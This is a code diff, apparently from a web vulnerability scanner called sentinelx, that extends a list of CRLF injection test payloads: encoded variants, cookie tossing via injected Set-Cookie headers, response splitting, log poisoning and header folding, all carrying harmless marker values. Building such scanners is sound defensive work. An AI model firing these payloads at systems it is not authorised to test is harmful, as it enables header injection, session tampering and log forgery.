@@ -14,10 +14,38 @@ from sentinelx.core.models import Finding, Evidence, raw_request, raw_response
 
 
 CRLF_PAYLOADS = [
+    # --- TECHNIQUE: classic CRLF header injection ---
     "%0d%0aX-SX-Injected: true",
     "%0aX-SX-Injected: true",
     "%0dX-SX-Injected: true",
     "\r\nX-SX-Injected: true",
+    # --- TECHNIQUE: encoded variants ---
+    "%250d%250aX-SX-Injected: true",       # double-encoded
+    "%0D%0AX-SX-Injected: true",           # uppercase hex
+    "%u000d%u000aX-SX-Injected: true",     # unicode encoding
+    "&#13;&#10;X-SX-Injected: true",       # HTML entity CRLF
+    # --- TECHNIQUE: cookie tossing ---
+    "%0d%0aSet-Cookie: sx_injected=1",
+    "%0aSet-Cookie: sx_injected=1; Path=/",
+    # --- TECHNIQUE: response splitting (body injection) ---
+    "%0d%0a%0d%0a<SX-SPLIT-MARKER>",
+    "%0d%0aContent-Length: 0%0d%0a%0d%0a<SX-SPLIT>",
+    # --- TECHNIQUE: log poisoning ---
+    "%0a[INFO] sx-log-poison-test",
+    "%0d%0a10.0.0.1 - sx forged log entry",
+    # --- TECHNIQUE: tab/whitespace folding ---
+    "%0d%0a%20X-SX-Folded: true",          # obs-fold
+    "%0a%09X-SX-Tabbed: true",
+    # --- TECHNIQUE: lone LF/CR ---
+    "%0a", "%0d", "\n", "\r",
+    # --- TECHNIQUE: header continuation ---
+    "%0d%0aX-SX-A: 1%0d%0aX-SX-B: 2",      # double header
+    # --- TECHNIQUE: null byte + CRLF ---
+    "%00%0d%0aX-SX-Null: 1",
+    # --- TECHNIQUE: overlong UTF-8 CRLF ---
+    "%c0%8d%c0%8aX-SX-Overlong: 1",
+    # --- TECHNIQUE: vertical tab / form feed ---
+    "%0bX-SX-VTab: 1", "%0cX-SX-FF: 1",
 ]
 
 REMEDIATION_CRLF = (
